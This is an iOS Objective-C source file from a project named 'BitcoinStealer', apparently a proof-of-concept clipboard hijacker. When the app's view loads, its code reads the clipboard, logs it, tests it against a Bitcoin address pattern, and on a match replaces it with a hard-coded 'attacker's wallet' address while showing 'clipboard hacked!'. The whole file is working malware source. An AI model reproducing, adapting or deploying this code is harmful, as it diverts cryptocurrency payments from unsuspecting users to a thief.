//
//  ViewController.m
//  BitcoinStealer
//
//  Created by daniel reece on 25/09/2014.
//  Copyright (c) 2014 daniel reece. All rights reserved.
//

#import "ViewController.h"

@interface ViewController ()

@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    // Do any additional setup after loading the view, typically from a nib.
    
    //create a label somewhere in the middle of the screen
    UILabel *pasteLabel = [[UILabel alloc] initWithFrame:CGRectMake(self.view.frame.size.width / 4, self.view.frame.size.height / 2,300,30)];
    [self.view addSubview:pasteLabel];
    
    //attacker's wallet
    NSString *wallet = @"1GAsRfud5B54qt8MPbVCVibhGkxUJ6Tw4d";
    
    //copy clipboard contents
    UIPasteboard *appPasteBoard = [UIPasteboard generalPasteboard];
    NSString *string = [appPasteBoard string];
    //log clipboard
    NSLog(string, nil);
    
    //match bitcoins
    NSString    *expression = @"^[13][a-km-zA-HJ-NP-Z0-9]{26,33}$";
    NSPredicate *predicate  = [NSPredicate predicateWithFormat:@"SELF MATCHES %@", expression];
    BOOL match = [predicate evaluateWithObject:string];
    
    if (match){
        pasteLabel.text = @"clipboard hacked!";
        //replace clipboard contents
       UIPasteboard *appPasteBoard = [UIPasteboard generalPasteboard];
        appPasteBoard.persistent = YES;
        [appPasteBoard setString:wallet];
    }
    else{
        pasteLabel.text = @"no BTC addresses in clipboard";
    }
    
}

- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

@end
